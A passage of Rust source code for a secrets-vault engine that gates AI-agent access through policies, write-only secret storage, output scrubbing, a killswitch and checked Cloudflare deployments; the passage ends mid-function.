//! Vaultly Core Engine — single source of truth for all vault operations.
//! Both CLI and MCP server use this — same permissions, same audit, same security.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use base64::Engine as _;
use serde_json::{Map, Value};
use tokio::io::{AsyncRead, AsyncReadExt};
use tokio::process::Command as TokioCommand;

use crate::crypto::SecretMeta;
use crate::deploy::{
    approved_target_script, discover_deployment_spec, extract_secret_names, is_migration_file,
    migration_safety_verdict, parse_d1_migration_query, patch_d1_database_id, pending_migrations,
    target_exec_allowed_keys, wrangler_d1_bindings, wrangler_r2_bindings, D1Preflight,
    DeploymentProvider, DeploymentResult, DeploymentTarget, TargetExecResult, TargetPreflight,
    APPROVED_TARGET_SCRIPTS,
};
use crate::error::{Result, VaultError};
use crate::policy::{CallerContext, Operation, PolicyEngine};
use crate::scrubber::scrub_output;
use crate::vault::VaultStore;
use zeroize::{Zeroize, Zeroizing};

pub const MAX_BUFFER: usize = 5 * 1024 * 1024; // 5MB output cap per stream
pub const DEFAULT_TIMEOUT_MS: u64 = 300_000; // 5 minutes
pub const DEFAULT_SESSION_TTL_MINUTES: u64 = 60; // engine default; MCP passes 120

/// Budget (chars) for failure output surfaced to agents per stream.
/// Deployment subprocess output is already secret-scrubbed by
/// `run_with_secrets` (build output never receives credentials), so the tail
/// is safe to show. Agents cannot diagnose guard refusals from an exit code
/// alone; without the tail every failure needs a human to re-run it.
pub const FAILURE_OUTPUT_CHARS: usize = 2000;

/// Last-`max` chars of trimmed output; empty when there is nothing to show.
fn output_tail(output: &str, max: usize) -> String {
    let trimmed = output.trim();
    if trimmed.is_empty() {
        return String::new();
    }
    let chars: Vec<char> = trimmed.chars().collect();
    if chars.len() > max {
        chars[chars.len() - max..].iter().collect()
    } else {
        trimmed.to_string()
    }
}

/// Combine scrubbed stdout/stderr tails for agent-facing failure errors.
/// Callers must only pass output that is already secret-scrubbed (or never
/// contained credentials, e.g. credential-free builds).
fn failure_output_detail(stdout: &str, stderr: &str) -> String {
    let mut parts = Vec::new();
    let err = output_tail(stderr, FAILURE_OUTPUT_CHARS);
    if !err.is_empty() {
        parts.push(format!("stderr: {err}"));
    }
    let out = output_tail(stdout, FAILURE_OUTPUT_CHARS);
    if !out.is_empty() {
        parts.push(format!("stdout: {out}"));
    }
    if parts.is_empty() {
        "No output returned".to_string()
    } else {
        parts.join("\n")
    }
}

// Every Unix child starts its own process group. Kill remaining descendants
// when the invocation ends or is cancelled, including holders of output pipes.
#[cfg(unix)]
struct CommandGroup(i32);

#[cfg(unix)]
impl Drop for CommandGroup {
    fn drop(&mut self) {
        if self.0 > 0 {
            // SAFETY: this positive PID identifies the group created for our
            // child; the negative argument targets that group only.
            unsafe {
                libc::kill(-self.0, libc::SIGKILL);
            }
        }
    }
}

/// Options for [`VaultEngine::run`] / [`VaultEngine::run_command`].
/// `None` fields preserve the "inject everything / use default" semantics.
#[derive(Debug, Clone, Default)]
pub struct RunOptions<'a> {
    pub cwd: Option<&'a str>,
    pub timeout_ms: Option<u64>,
    pub allowed_keys: Option<&'a [String]>,
}

#[derive(Debug, Clone)]
pub struct RunResult {
    pub stdout: String,
    pub stderr: String,
    pub code: i32,
    pub secrets_injected: Vec<String>,
    pub scrubbed: bool,
}

#[derive(Debug, Clone)]
pub struct ApiResult {
    pub status: u16,
    pub data: Value,
}
/// Agent-safe summary of a vault that holds Cloudflare credentials.
/// Deliberately NO secret values — only the vault name, auth method, and
/// whether an account ID is present.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct CfAccountInfo {
    pub vault: String,
    /// "token", "email+key", or "partial" (incomplete credential set).
    pub auth: String,
    pub has_account_id: bool,
    /// Optional human-readable alias (set via cf_account_label).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub label: Option<String>,
    /// Whether the current agent may perform Cloudflare API calls on this vault.
    pub cf_api: bool,
    /// Whether the current agent may deploy (run) on this vault.
    pub deploy: bool,
}
/// Per-account live health result (from a Cloudflare verify call).
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct CfAccountHealth {
    pub vault: String,
    pub ok: bool,
    pub message: String,
}
/// Agent-safe inventory entry for a D1 database, R2 bucket, or KV namespace:
/// the resource name and its non-secret id. Never any stored value.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct StorageResource {
    pub name: String,
    pub id: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AuditEntry {
    pub ts: String,
    pub action: String,
    pub detail: String,
    pub caller: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub agent: Option<String>,
}

pub struct VaultEngine {
    key: Option<Zeroizing<Vec<u8>>>,
    store: VaultStore,
    /// Only the default user vault may control the user's Keychain entry.
    /// Explicit test/custom stores must never clear the real Keychain.
    manages_keychain: bool,
    policy: PolicyEngine,
    unlocked_at: Option<Instant>,
    session_ttl: Duration,
    /// Idle auto-lock: wipe the key after this much inactivity (`None` =
    /// disabled; session TTL still applies). Read from config at unlock time.
    auto_lock: Option<Duration>,
    /// Last successful operation time, for idle auto-lock.
    last_activity: Instant,
    /// Cloudflare API base URL. Overridable for tests.
    pub cf_base: String,
}

impl Drop for VaultEngine {
    /// Defensive wipe: zero the master key buffer even if `lock` was never
    /// called (e.g. the process is dropping the engine without an explicit lock).
    fn drop(&mut self) {
        self.zero_key();
    }
}

impl VaultEngine {
    pub fn new(session_ttl_minutes: Option<u64>) -> Self {
        Self {
            key: None,
            store: VaultStore::new(),
            manages_keychain: true,
            policy: PolicyEngine::new(),
            unlocked_at: None,
            session_ttl: Duration::from_secs(
                (session_ttl_minutes.unwrap_or(DEFAULT_SESSION_TTL_MINUTES)) * 60,
            ),
            auto_lock: None,
            last_activity: Instant::now(),
            cf_base: "https://api.cloudflare.com/client/v4".to_string(),
        }
    }

    /// Explicit store directory (tests). Bypasses VAULTLY_DIR.
    pub fn with_dir(session_ttl_minutes: Option<u64>, dir: PathBuf) -> Self {
        let mut engine = Self::new(session_ttl_minutes);
        engine.store = VaultStore::with_dir(dir);
        engine.manages_keychain = false;
        engine
    }

    pub fn store(&self) -> &VaultStore {
        &self.store
    }

    // ─── Lifecycle ────────────────────────────────────────

    pub fn is_initialized(&self) -> bool {
        self.store.is_initialized()
    }

    pub fn is_unlocked(&mut self) -> bool {
        if self.key.is_none() {
            return false;
        }
        // Check TTL
        if let Some(at) = self.unlocked_at {
            if at.elapsed() > self.session_ttl {
                self.lock(None);
                return false;
            }
        }
        true
    }

    pub fn session_expires_in(&self) -> u64 {
        match self.unlocked_at {
            Some(at) => {
                let elapsed = at.elapsed();
                if elapsed >= self.session_ttl {
                    0
                } else {
                    (self.session_ttl - elapsed).as_secs()
                }
            }
            None => 0,
        }
    }

    pub fn unlock(&mut self, password: &str) -> Result<()> {
        // A killswitch (from another process, e.g. `vaultly kill`) refuses
        // re-entry until explicitly cleared.
        if self.store.is_killed() {
            let _ = self.store.clear_killed(); // intentional re-open
        }
        let key = self.store.unlock(password)?;
        self.key = Some(key);
        self.unlocked_at = Some(Instant::now());
        self.last_activity = Instant::now();
        if let Ok(config) = self.store.load_config() {
            self.auto_lock = config
                .auto_lock_minutes
                .map(|m| Duration::from_secs(m * 60));
        }
        self.audit("UNLOCK", "Vault unlocked", None);
        Ok(())
    }

    /// Lock vault — wipe key from memory
    pub fn lock(&mut self, ctx: Option<&CallerContext>) {
        self.zero_key();
        self.audit("LOCK", "Vault locked", ctx);
    }

    /// Killswitch — emergency lock + clear all session data. Writes a
    /// persistent marker so a long-running MCP server (separate process) also
    /// refuses further operations until a fresh unlock clears it.
    pub fn kill(&mut self, ctx: Option<&CallerContext>) {
        self.lock(ctx);
        let _ = self.store.set_killed();
        if self.manages_keychain {
            crate::keychain::delete_from_keychain();
        }
        self.audit(
            "KILL",
            "🚨 Killswitch activated — vault locked, keychain cleared",
            ctx,
        );
    }

    /// Load agent policies from the `VAULTLY_AGENT_POLICY` env var (a path to
    /// a JSON policy file). Returns the number of agents registered, or `0`
    /// when the variable is unset or empty.
    pub fn load_policy_from_env(&mut self) -> Result<usize> {
        let path = match std::env::var("VAULTLY_AGENT_POLICY").ok() {
            Some(p) if !p.trim().is_empty() => p,
            _ => return Ok(0),
        };
        self.policy.load(path.trim())
    }

    /// Load owner-managed agent policies from `agent-policy.json` in the
    /// vault directory. This is the documented human grant mechanism: the
    /// owner writes per-agent operation allowlists here (e.g. granting
    /// `run` to an agent scoped to one vault) so approval-gated
    /// maintenance scripts (`migrate:apply --confirm APPLY`) work without
    /// threading policy through the environment.
    ///
    /// Returns the number of agents registered, or `0` when the file is
    /// absent. Fails closed on a group/other-writable file: an agent must
    /// not be able to widen its own permissions by editing the grant.
    pub fn load_default_policy_file(&mut self) -> Result<usize> {
        let path = self.store.dir().join("agent-policy.json");
        if !path.exists() {
            return Ok(0);
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&path)?.permissions().mode();
            if mode & 0o022 != 0 {
                return Err(VaultError::Policy(format!(
                    "refusing to load group/other-writable agent policy file '{}' (mode {:o}); fix with `chmod 600`",
                    path.display(),
                    mode & 0o777
                )));
            }
        }
        let path_str = path.to_str().ok_or_else(|| {
            VaultError::ConfigCorrupt("agent policy path is not valid UTF-8".to_string())
        })?;
        self.policy.load(path_str)
    }

    /// Replace the agent policy set programmatically (used by the REST edge
    /// and MCP server to apply role-based policies).
    pub fn set_agent_policies<I: IntoIterator<Item = crate::policy::AgentPolicy>>(
        &mut self,
        agents: I,
    ) {
        self.policy.set_agents(agents);
    }

    /// Agent-safe snapshot of the effective agent policies: names, op
    /// allowlists, vault/role scopes — never secret values.
    pub fn policy_info(&self) -> serde_json::Value {
        use crate::policy::{AllowedOperations, AllowedVaults};
        let summaries = self.policy.policy_summaries();
        let agents: Vec<serde_json::Value> = summaries
            .into_iter()
            .map(|p| {
                let ops = match &p.allowed_operations {
                    AllowedOperations::All => serde_json::Value::String("*".to_string()),
                    AllowedOperations::List(ops) => serde_json::Value::Array(
                        ops.iter()
                            .map(|o| serde_json::Value::String(o.as_str().to_string()))
                            .collect(),
                    ),
                };
                let vaults = match &p.allowed_vaults {
                    AllowedVaults::All => serde_json::Value::String("*".to_string()),
                    AllowedVaults::List(vs) => serde_json::Value::Array(
                        vs.iter()
                            .map(|v| serde_json::Value::String(v.clone()))
                            .collect(),
                    ),
                };
                serde_json::json!({
                    "name": p.name,
                    "allowed_vaults": vaults,
                    "allowed_operations": ops,
                    "roles": p.roles,
                    "vault_roles": p.vault_roles,
                    "max_ops_per_minute": p.max_ops_per_minute,
                })
            })
            .collect();
        serde_json::Value::Array(agents)
    }

    /// Central gate applied at the start of every operation: refuse when a
    /// killswitch is set, enforce idle auto-lock, then check policy.
    fn op(&mut self, ctx: Option<&CallerContext>, op: Operation, vault: &str) -> Result<()> {
        if self.store.is_killed() {
            return Err(VaultError::Policy(
                "🚨 Killswitch active — vault operations disabled. Run 'vaultly unlock' to re-open.".to_string(),
            ));
        }
        self.enforce_auto_lock();
        self.last_activity = Instant::now();
        self.policy.check(ctx, op, vault)
    }

    /// Auto-lock: wipe the key if idle longer than the configured threshold.
    fn enforce_auto_lock(&mut self) {
        if self.key.is_none() {
            return;
        }
        if let Some(limit) = self.auto_lock {
            if self.last_activity.elapsed() >= limit {
                self.zero_key();
            }
        }
    }

    fn require_unlocked(&mut self) -> Result<&[u8]> {
        let expired = self
            .unlocked_at
            .map(|at| at.elapsed() > self.session_ttl)
            .unwrap_or(false);

        let unlocked = self.key.is_some() && !expired;

        if !unlocked {
            let was_unlocked = self.unlocked_at.is_some();
            if expired {
                // Zero the key on TTL expiry instead of leaving it in memory.
                self.zero_key();
            }
            return Err(if was_unlocked {
                VaultError::SessionExpired
            } else {
                VaultError::Locked
            });
        }
        Ok(self.key.as_ref().ok_or(VaultError::Locked)?)
    }

    /// Borrow-unlocked key copy wrapped in `Zeroizing` so each call-site copy
    /// is wiped when it drops. Store calls take `&[u8]` via deref coercion.
    fn require_unlocked_copy(&mut self) -> Result<Zeroizing<Vec<u8>>> {
        Ok(Zeroizing::new(self.require_unlocked()?.to_vec()))
    }

    fn zero_key(&mut self) {
        if let Some(mut key) = self.key.take() {
            key.zeroize(); // wipe the key buffer before dropping
        }
        self.unlocked_at = None;
    }

    // ─── Vault Operations ─────────────────────────────────

    pub fn list_vaults(&mut self, ctx: Option<&CallerContext>) -> Result<Vec<String>> {
        self.op(ctx, Operation::List, "*")?;
        let vaults = self.store.list_vaults();
        self.audit("LIST_VAULTS", &format!("{} vaults", vaults.len()), ctx);
        Ok(vaults)
    }
    /// Agent-safe: which vaults hold Cloudflare credentials, and how they
    /// authenticate. Inspects key NAMES only — never secret values.
    pub fn list_cf_accounts(&mut self, ctx: Option<&CallerContext>) -> Result<Vec<CfAccountInfo>> {
        let mut accounts = Vec::new();
        for vault in self.list_vaults(ctx)? {
            // Skip vaults this agent isn't allowed to read keys from, so a
            // scoped agent still gets a usable (filtered) account list.
            if self.policy.check(ctx, Operation::ReadKeys, &vault).is_err() {
                continue;
            }
            let keys = match self.list_keys(&vault, ctx) {
                Ok(k) => k,
                Err(_) => continue,
            };
            let has_token = keys.iter().any(|k| k == "CLOUDFLARE_API_TOKEN");
            let has_email = keys.iter().any(|k| k == "CLOUDFLARE_EMAIL");
            let has_key = keys.iter().any(|k| k == "CLOUDFLARE_API_KEY");
            let has_account_id = keys.iter().any(|k| k == "CLOUDFLARE_ACCOUNT_ID");
            if !has_token && !has_email && !has_key && !has_account_id {
                continue;
            }
            let auth = if has_token {
                "token".to_string()
            } else if has_email && has_key {
                "email+key".to_string()
            } else {
                "partial".to_string()
            };
            let label = self.store.get_vault_label(&vault).unwrap_or(None);
            let cf_api = self.policy.check(ctx, Operation::CfApi, &vault).is_ok();
            let deploy = self.policy.check(ctx, Operation::Deploy, &vault).is_ok();
            accounts.push(CfAccountInfo {
                vault,
                auth,
                has_account_id,
                label,
                cf_api,
                deploy,
            });
        }
        accounts.sort_by(|a, b| a.vault.cmp(&b.vault));
        self.audit(
            "CF_ACCOUNTS",
            &format!("{} Cloudflare accounts", accounts.len()),
            ctx,
        );
        Ok(accounts)
    }
    /// Live health for every Cloudflare account the current agent may use.
    /// Verifies each token/credential against the Cloudflare API. Agent-safe —
    /// returns only a boolean + message, never a credential value.
    pub async fn cf_accounts_health(
        &mut self,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<CfAccountHealth>> {
        let accounts = self.list_cf_accounts(ctx)?;
        let mut out = Vec::new();
        for a in accounts {
            if !a.cf_api {
                out.push(CfAccountHealth {
                    vault: a.vault,
                    ok: false,
                    message: "not permitted for this agent".to_string(),
                });
                continue;
            }
            match self.health_check(&a.vault, ctx).await {
                Ok((ok, msg)) => out.push(CfAccountHealth {
                    vault: a.vault,
                    ok,
                    message: msg,
                }),
                Err(e) => out.push(CfAccountHealth {
                    vault: a.vault,
                    ok: false,
                    message: e.to_string(),
                }),
            }
        }
        Ok(out)
    }

    /// Get a vault's human-readable label (agent-safe — non-secret).
    pub fn get_account_label(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Option<String>> {
        self.op(ctx, Operation::ReadKeys, vault_name)?;
        self.store.get_vault_label(vault_name)
    }

    /// Set or clear a vault's human-readable label (used as a Cloudflare
    /// account alias). `None` clears. Agent-safe — non-secret.
    pub fn set_account_label(
        &mut self,
        vault_name: &str,
        label: Option<&str>,
        ctx: Option<&CallerContext>,
    ) -> Result<()> {
        self.op(ctx, Operation::Write, vault_name)?;
        self.store
            .set_vault_label(vault_name, label.map(|s| s.to_string()))?;
        self.audit(
            "CF_ACCOUNT_LABEL",
            &format!("{}/{}", vault_name, label.unwrap_or("(cleared)")),
            ctx,
        );
        Ok(())
    }

    pub fn list_keys(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<String>> {
        self.op(ctx, Operation::ReadKeys, vault_name)?;
        let key = self.require_unlocked_copy()?;
        let keys = self.store.list_keys(vault_name, &key)?;
        self.audit(
            "LIST_KEYS",
            &format!("{}: {} keys", vault_name, keys.len()),
            ctx,
        );
        Ok(keys)
    }

    /// WRITE-ONLY: store a secret. Cannot read back (for agents).
    pub fn add_secret(
        &mut self,
        vault_name: &str,
        secret_key: &str,
        value: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<()> {
        self.add_secret_with_expiry(vault_name, secret_key, value, None, ctx)
    }

    /// WRITE-ONLY: store a secret with an optional expiry (RFC 3339). Same
    /// agent-safety as `add_secret` — the value is never readable.
    pub fn add_secret_with_expiry(
        &mut self,
        vault_name: &str,
        secret_key: &str,
        value: &str,
        expires_at: Option<&str>,
        ctx: Option<&CallerContext>,
    ) -> Result<()> {
        self.op(ctx, Operation::Write, vault_name)?;
        let key = self.require_unlocked_copy()?;
        self.store
            .set_secret_ex(vault_name, secret_key, value, expires_at, &key)?;
        self.audit(
            "ADD",
            &format!("{}/{} (value hidden)", vault_name, secret_key),
            ctx,
        );
        Ok(())
    }

    /// Agent-safe per-key metadata (timestamps + expiry) — NO values.
    pub fn list_keys_meta(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<SecretMeta>> {
        self.op(ctx, Operation::ReadKeys, vault_name)?;
        let key = self.require_unlocked_copy()?;
        let meta = self.store.get_secret_meta(vault_name, &key)?;
        let mut list: Vec<SecretMeta> = meta.into_values().collect();
        list.sort_by(|a, b| a.key.cmp(&b.key));
        self.audit(
            "LIST_KEYS_META",
            &format!("{}: {} keys", vault_name, list.len()),
            ctx,
        );
        Ok(list)
    }

    /// Meta for a single secret (timestamps + expiry, no value).
    pub fn secret_meta(
        &mut self,
        vault_name: &str,
        secret_key: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<SecretMeta> {
        self.op(ctx, Operation::ReadKeys, vault_name)?;
        let key = self.require_unlocked_copy()?;
        let meta = self.store.get_secret_meta(vault_name, &key)?;
        meta.get(secret_key).cloned().ok_or_else(|| {
            VaultError::SecretNotFound(secret_key.to_string(), vault_name.to_string())
        })
    }

    /// Agent-safe: the names of secrets in `vault` that have expired (empty if
    /// none). Used by `rotate --expired` and to refuse `run` on expired
    /// secrets — never returns values.
    pub fn expired_keys(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Vec<String>> {
        let meta = self.list_keys_meta(vault_name, ctx)?;
        Ok(meta
            .into_iter()
            .filter(|m| m.expired)
            .map(|m| m.key)
            .collect())
    }

    pub fn delete_secret(
        &mut self,
        vault_name: &str,
        secret_key: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<bool> {
        self.op(ctx, Operation::Delete, vault_name)?;
        let key = self.require_unlocked_copy()?;
        let deleted = self.store.delete_secret(vault_name, secret_key, &key)?;
        self.audit(
            "DELETE",
            &format!("{}/{} success={}", vault_name, secret_key, deleted),
            ctx,
        );
        Ok(deleted)
    }

    pub fn delete_vault(&mut self, vault_name: &str, ctx: Option<&CallerContext>) -> Result<bool> {
        self.op(ctx, Operation::DeleteVault, vault_name)?;
        let deleted = self.store.delete_vault(vault_name)?;
        self.audit(
            "DELETE_VAULT",
            &format!("{} success={}", vault_name, deleted),
            ctx,
        );
        Ok(deleted)
    }

    /// Read a raw secret value. Human-only — agents are blocked by policy (read_value).
    pub fn get_secret_value(
        &mut self,
        vault_name: &str,
        secret_key: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<String> {
        self.op(ctx, Operation::ReadValue, vault_name)?;
        let key = self.require_unlocked_copy()?;
        let value = self.store.get_secret(vault_name, secret_key, &key)?;
        match value {
            Some(v) => {
                self.audit("GET", &format!("{}/{}", vault_name, secret_key), ctx);
                Ok(v)
            }
            None => Err(VaultError::SecretNotFound(
                secret_key.to_string(),
                vault_name.to_string(),
            )),
        }
    }

    pub fn import_secrets(
        &mut self,
        vault_name: &str,
        entries: &Map<String, Value>,
        ctx: Option<&CallerContext>,
    ) -> Result<usize> {
        self.op(ctx, Operation::Write, vault_name)?;
        let key = self.require_unlocked_copy()?;
        let count = self.store.import_secrets(vault_name, entries, &key)?;
        self.audit("IMPORT", &format!("{}: {} secrets", vault_name, count), ctx);
        Ok(count)
    }

    /// Read all secret values (human-only — agents are blocked by read_value policy).
    pub fn get_secrets(
        &mut self,
        vault_name: &str,
        ctx: Option<&CallerContext>,
    ) -> Result<Map<String, Value>> {
        self.op(ctx, Operation::ReadValue, vault_name)?;
        self.read_secrets(vault_name)
    }

    /// Internal: read secrets for injection/CF calls.
    /// No read_value check — callers (run, cf_api, ...) already gate on their
    /// own policy operation, and agents are allowed to use values downstream.
    fn read_secrets(&mut self, vault_name: &str) -> Result<Map<String, Value>> {
        let key = self.require_unlocked_copy()?;
        self.store.get_secrets(vault_name, &key)
    }

    // ─── Command Execution (with scrubbing) ───────────────

    pub async fn run(
        &mut self,
        vault_name: &str,
        command: &str,
        args: &[String],
        opts: &RunOptions<'_>,
        ctx: Option<&CallerContext>,
    ) -> Result<RunResult> {
        self.op(ctx, Operation::Run, vault_name)?;

        self.run_with_secrets(vault_name, command, args, opts, ctx, "RUN")
            .await
    }

    /// Run a command with an explicit secret allowlist after the caller has
    /// already authorized a higher-level operation such as deployment. This
    /// deliberately does not grant the generic `run` operation: validated
    /// deployment targets need a scoped subprocess without turning the agent
    /// interface into arbitrary command execution.
    async fn run_with_secrets(
        &mut self,
        vault_name: &str,
        command: &str,
        args: &[String],
        opts: &RunOptions<'_>,
        ctx: Option<&CallerContext>,
        audit_action: &str,
    ) -> Result<RunResult> {
        let vault_exists = self.store.vault_exists(vault_name)?;
        let secrets = self.read_secrets(vault_name)?;
        // `allowed_keys` restricts which secrets are injected into the child
        // (env allowlist). None = inject every secret in the vault.
        let allowed = |key: &str| match opts.allowed_keys {
            Some(keys) => keys.iter().any(|k| k == key),
            None => true,
        };
        let key = self.require_unlocked_copy()?;
        if self
            .store
            .get_secret_meta(vault_name, &key)?
            .iter()
            .any(|(name, meta)| allowed(name) && meta.expired)
        {
            return Err(VaultError::Policy(
                "An approved subprocess credential has expired".into(),
            ));
        }
        let secret_keys: Vec<String> = secrets.keys().filter(|k| allowed(k)).cloned().collect();
        // Borrow as &str to avoid cloning secret values for the scrubber.
        let secret_values: Vec<&str> = secrets
            .iter()
            .filter(|(k, _)| allowed(k))
            .filter_map(|(_, v)| v.as_str())
            .collect();

        if secret_keys.is_empty() {
            return Err(if vault_exists {
                VaultError::VaultEmpty(vault_name.to_string())
            } else {
                VaultError::VaultNotFound(vault_name.to_string())
            });
        }

        self.audit(
            audit_action,
            &format!(
                "vault={} cmd=\"{} {}\" secrets=[{}]",
                vault_name,
                command,
                args.join(" "),
                secret_keys.join(",")
            ),
            ctx,
        );

        let env: Vec<(String, String)> = secrets
            .iter()
            .filter(|(k, _)| allowed(k))
            .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
            .collect();

        let result = self
            .spawn(
                command,
                args,
                &env,
                opts.cwd,
                opts.timeout_ms.unwrap_or(DEFAULT_TIMEOUT_MS),
            )
            .await?;

        // SCRUB secret values from output before returning
        let scrubbed_stdout = scrub_output(&result.stdout, &secret_values);
        let scrubbed_stderr = scrub_output(&result.stderr, &secret_values);
        let was_scrubbed = scrubbed_stdout != result.stdout || scrubbed_stderr != result.stderr;

        if was_scrubbed {
            self.audit(
                "SCRUB",
                &format!("Scrubbed secret values from output of: {}", command),
                ctx,
            );
        }

        Ok(RunResult {
            stdout: scrubbed_stdout,
            stderr: scrubbed_stderr,
            code: result.code,
            secrets_injected: secret_keys,
            scrubbed: was_scrubbed,
        })
    }

    /// Run a raw command string (parses into command + args)
    pub async fn run_command(
        &mut self,
        vault_name: &str,
        command_str: &str,
        opts: &RunOptions<'_>,
        ctx: Option<&CallerContext>,
    ) -> Result<RunResult> {
        let parts =
            shell_words::split(command_str).unwrap_or_else(|_| vec![command_str.to_string()]);
        let (cmd, args) = match parts.split_first() {
            Some((c, rest)) => (c.clone(), rest.to_vec()),
            None => {
                return Err(VaultError::CommandSpawn(
                    String::new(),
                    "Empty command".into(),
                ))
            }
        };
        self.run(vault_name, &cmd, &args, opts, ctx).await
    }

    /// Run a fixed build command with a deliberately empty environment.
    /// Deployment targets use this so project build scripts never receive
    /// Cloudflare credentials.
    async fn run_without_secrets(
        &mut self,
        command_str: &str,
        opts: &RunOptions<'_>,
        ctx: Option<&CallerContext>,
    ) -> Result<RunResult> {
        let parts = shell_words::split(command_str)?;
        let (cmd, args) = parts
            .split_first()
            .ok_or_else(|| VaultError::CommandSpawn(String::new(), "Empty build command".into()))?;
        self.audit("BUILD", &format!("command=\"{}\"", command_str), ctx);
        self.spawn(
            cmd,
            args,
            &[],
            opts.cwd,
            opts.timeout_ms.unwrap_or(DEFAULT_TIMEOUT_MS),
        )
        .await
    }

    /// Deploy a registered target. The caller supplies only the target
    /// metadata selected by a human; account/project values are never accepted
    /// as per-request agent arguments.
    pub async fn deploy_target(
        &mut self,
        target: &DeploymentTarget,
        ctx: Option<&CallerContext>,
    ) -> Result<DeploymentResult> {
        target.validate().map_err(VaultError::Policy)?;
        self.op(ctx, Operation::Deploy, &target.vault)?;
        self.validate_agent_target(target, ctx)?;

        let account_id = self.cf_account_id(&target.vault)?;
        if account_id != target.account_id {
            return Err(VaultError::Policy(format!(
                "Deployment target '{}' is bound to a different Cloudflare account",
                target.id
            )));
        }

        let project_dir = PathBuf::from(&target.project_dir);
        let output_dir = project_dir.join(&target.output_dir);
        let build = self
            .run_without_secrets(
                &target.build_command,
                &RunOptions {
                    cwd: Some(&target.project_dir),
                    timeout_ms: Some(1_800_000),
                    allowed_keys: None,
                },
                ctx,
            )
            .await?;
        if build.code != 0 {
            return Err(VaultError::Policy(format!(
                "Build failed for target '{}' with exit code {}:\n{}",
                target.id,
                build.code,
                failure_output_detail(&build.stdout, &build.stderr)
            )));
        }

        // A build may outlive the unlock or change local target metadata.
        self.op(ctx, Operation::Deploy, &target.vault)?;
        self.validate_agent_target(target, ctx)?;
        if self.cf_account_id(&target.vault)? != target.account_id {
            return Err(VaultError::Policy(
                "Deployment account changed during build".into(),
            ));
        }

        // End-to-end provisioning: declared D1/R2 storage exists before
        // publish, so first deploys succeed without manual setup.
        self.bootstrap_target_storage(target, ctx).await?;

        self.publish_target(target, &output_dir, ctx).await
    }

    fn validate_agent_target(
        &self,
        target: &DeploymentTarget,
        ctx: Option<&CallerContext>,
    ) -> Result<()> {
        if ctx.is_some_and(|caller| caller.caller == crate::policy::Caller::Agent) {
            let targets = self.store.load_deployment_targets()?;
            if !targets.iter().any(|registered| registered == target) {
                return Err(VaultError::Policy(
                    "Deployment target is not registered with this exact metadata".into(),
                ));
            }
            if target.provider == DeploymentProvider::Worker && !target.worker_package_deploy {
                return Err(VaultError::Policy(
                    "Agent deployments require a dynamically adopted Worker target".into(),
                ));
            }
            let workspace = fs::canonicalize(
                std::env::current_dir()
                    .map_err(|e| VaultError::Policy(format!("cannot resolve workspace: {e}")))?,
            )
            .map_err(|e| VaultError::Policy(format!("cannot resolve workspace: {e}")))?;
            let target_dir = fs::canonicalize(&target.project_dir).map_err(|e| {
                VaultError::Policy(format!(
                    "cannot resolve deployment target directory '{}': {e}",
                    target.project_dir
                ))
            })?;
            if !target_dir.starts_with(&workspace) {
                return Err(VaultError::Policy(format!(
                    "Agent deployment target directory must be inside the current workspace: {}. \
Run this command from the repository that owns '{}' (its root or a subdirectory).",
                    target_dir.display(),
                    target.project_dir
                )));
            }
            if target.worker_package_deploy {
                let configs: Vec<_> = ["wrangler.json", "wrangler.jsonc", "wrangler.toml"]
                    .iter()
                    .map(|name| target_dir.join(name))
                    .filter(|path| path.is_file())
                    .collect();
                if configs.len() != 1 {
                    return Err(VaultError::Policy(
                        "Worker target requires exactly one default Wrangler config".into(),
                    ));
                }
                let spec = discover_deployment_spec(&configs[0]).map_err(VaultError::Policy)?;
                if spec.provider != target.provider
                    || spec.project != target.project
                    || spec.project_dir != target_dir
                    || spec.build_command != target.build_command
                    || spec.worker_package_deploy != target.worker_package_deploy
                {
                    return Err(VaultError::Policy(
                        "Worker config no longer matches adopted target".into(),
                    ));
                }
            }
        }
        Ok(())
    }

    async fn publish_target(
        &mut self,
        target: &DeploymentTarget,
        output_dir: &Path,
        ctx: Option<&CallerContext>,
    ) -> Result<DeploymentResult> {
        match target.provider {
            DeploymentProvider::Pages => self.deploy_pages_files(target, output_dir, ctx).await,
            DeploymentProvider::Worker => {
                // Dynamically adopted Workers run the repository's fixed
                // package deploy script. This preserves package predeploy
                // guards (remote migrations and required secret checks) while
                // Vaultly injects only the approved Cloudflare credentials.
                // Legacy human targets retain the old fixed Wrangler path.
                let allowed_keys = [
                    "CLOUDFLARE_API_TOKEN".to_string(),
                    "CLOUDFLARE_EMAIL".to_string(),
                    "CLOUDFLARE_API_KEY".to_string(),
                    "CLOUDFLARE_ACCOUNT_ID".to_string(),
                ];
                let result = if target.worker_package_deploy {
                    self.run_with_secrets(
                        &target.vault,
                        "npm",
                        &["run".to_string(), "deploy".to_string()],
                        &RunOptions {
                            cwd: Some(&target.project_dir),
                            timeout_ms: Some(1_800_000),
                            allowed_keys: Some(&allowed_keys),
                        },
                        ctx,
                        "DEPLOY_RUN",
                    )
                    .await?
                } else {
                    let args = vec![
                        "wrangler".to_string(),
                        "deploy".to_string(),
                        "--name".to_string(),
                        target.project.clone(),
                    ];
                    self.run_with_secrets(
                        &target.vault,
                        "npx",
                        &args,
                        &RunOptions {
